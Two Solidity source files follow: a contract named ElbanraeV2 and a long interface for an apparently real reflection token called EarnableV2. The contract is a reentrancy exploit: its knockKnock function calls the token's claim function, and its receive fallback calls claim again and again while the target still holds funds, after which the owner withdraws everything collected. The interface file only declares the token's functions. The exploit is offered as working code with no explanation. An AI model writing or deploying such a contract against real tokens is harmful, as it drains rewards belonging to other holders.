// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {EarnableV2} from "./interfaces/IEARNABLEV2.sol";

contract ElbanraeV2 {
  event Knocked(address target, uint256 balance);
  EarnableV2 public earnable;
  address public owner;
  uint256 public deposit;
  address public recipient;

  constructor() {
    owner = msg.sender;
  }

  function knockKnock(
    address _earnable,
    address _recipient,
    uint256 _deposit
  ) external {
    earnable = EarnableV2(_earnable);
    recipient = _recipient;
    deposit = _deposit;
    earnable.claim(recipient);
  }

  function transferBalance() external {
    require(msg.sender == owner, "No no nooo!");
    address payable _owner = payable(msg.sender);
    _owner.transfer(address(this).balance);
  }

  receive() external payable {
    if (address(earnable).balance >= deposit) {
      earnable.claim(recipient);
    }
    emit Knocked(address(earnable), address(earnable).balance);
  }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface EarnableV2 {
  function _liquidityFee() external view returns (uint256);

  function _maxSellTransactionAmount() external view returns (uint256);

  function _maxWalletToken() external view returns (uint256);

  function _numTokensSellToAddToLiquidity() external view returns (uint256);

  function _rewardFee() external view returns (uint256);

  function _routerAddress() external view returns (address);

  function _taxFee() external view returns (uint256);

  function _transferClaimedEnabled() external view returns (bool);

  function addBNBToReward() external;

  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function balanceOf(address account) external view returns (uint256);

  function boughtBy(address account) external view returns (uint256);

  function boughtTotal() external view returns (uint256);

  function claim(address recipient) external;

  function claimToken(address token) external;

  function claimed(address recipient) external view returns (uint256);

  function clean(address account) external;

  function decimals() external view returns (uint8);

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    returns (bool);

  function deliver(uint256 tAmount) external;

  function doSwapForRouter() external view returns (bool);

  function enableTrading() external;

  function excludeFromFee(address account) external;

  function excludeFromMaxWalletToken(address account, bool excluded) external;

  function excludeFromReward(address account) external;

  function getUnlockTime() external view returns (uint256);

  function getUnlockTimeJanitor() external view returns (uint256);

  function includeInFee(address account) external;

  function includeInReward(address account) external;

  function increaseAllowance(address spender, uint256 addedValue)
    external
    returns (bool);

  function isCleaned(address account) external view returns (bool);

  function isExcludedFromFee(address account) external view returns (bool);

  function isExcludedFromMaxWalletToken(address account)
    external
    view
    returns (bool);

  function isExcludedFromReward(address account) external view returns (bool);

  function janitor() external view returns (address);

  function lock(uint256 time) external;

  function lockJanitor(uint256 time) external;

  function migrateRouter(address routerAddress) external;

  function name() external view returns (string calldata);

  function owner() external view returns (address);

  function pancakeswapV2Pair() external view returns (address);

  function pancakeswapV2Router() external view returns (address);

  function progressiveFeeEnabled() external view returns (bool);

  function reflectionFromToken(uint256 tAmount, bool deductTransferFee)
    external
    view
    returns (uint256);

  function reinvest() external;

  function renounceJanitorship() external;

  function renounceOwnership() external;

  function rewards(address recipient) external view returns (uint256);

  function setDoSwapForRouter(bool _enabled) external;

  function setLiquidityFeePromille(uint256 liquidityFee) external;

  function setMaxSellPercent(uint256 maxTxPercent) external;

  function setNumTokensSellToAddToLiquidity(
    uint256 numTokensSellToAddToLiquidity
  ) external;

  function setPairAddress(address pairAddress) external;

  function setProgressiveFeeEnabled(bool _enabled) external;

  function setRouterAddress(address routerAddress) external;

  function setSwapAndLiquifyEnabled(bool _enabled) external;

  function setTaxFeePromille(uint256 taxFee) external;

  function setTradingEnabled(bool _enabled) external;

  function setTransferClaimedEnabled(bool _enabled) external;

  function setWhaleProtectionEnabled(bool _enabled) external;

  function swapAndLiquifyEnabled() external view returns (bool);

  function sweep(address recipient) external;

  function symbol() external view returns (string calldata);

  function tokenFromReflection(uint256 rAmount) external view returns (uint256);

  function totalClaimed() external view returns (uint256);

  function totalFees() external view returns (uint256);

  function totalRewards() external view returns (uint256);

  function totalSupply() external view returns (uint256);

  function tradingEnabled() external view returns (bool);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  function transferJanitorship(address newJanitor) external;

  function transferOwnership(address newOwner) external;

  function unclean(address account) external;

  function unlock() external;

  function unlockJanitor() external;

  function whaleProtectionEnabled() external view returns (bool);
}